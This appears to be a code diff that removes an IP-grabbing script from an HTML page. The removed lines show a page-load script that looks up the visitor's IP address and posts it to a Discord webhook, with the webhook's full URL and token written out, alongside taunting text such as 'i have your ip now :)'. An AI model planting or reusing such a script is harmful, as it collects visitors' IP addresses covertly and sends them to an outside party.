@@ -11,46 +11,14 @@
         }
     </style>
  
-    <script src=
-"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-    </script>
- 
     <script>
-        // hi mr hacker
-        $(document).ready(()=>{
-            $.getJSON("https://api.ipify.org?format=json",
-            function (data) {
- 
-                // Displayin IP address on screen
-                var request = new XMLHttpRequest();
-                request.open("POST", "https://discord.com/api/webhooks/1229217673796124805/p8nKuqYVP_AwGe-e0awXVRXlFc1ZqlPcjdjiRKH48fNnVTtQVvOETKgbZ-U_hiwManri");
-
-                request.setRequestHeader('Content-type', 'application/json');
-
-                var params = {
-                    username: "snatched someones ip :DD",
-                    avatar_url: "",
-                    content: data.ip
-                }
-
-                request.send(JSON.stringify(params));
-
-                $("#gfg").html(data.ip);
-            })
-        });
+        
     </script>
 </head>
  
 <body>
     <center>
-        <h1>
-              helmaroc0 ##
-          </h1>
-        <h3>
-              i have your ip now :)
-          </h3>
-        <p id="gfg"></p>
- 
+
     </center>
 </body>
  
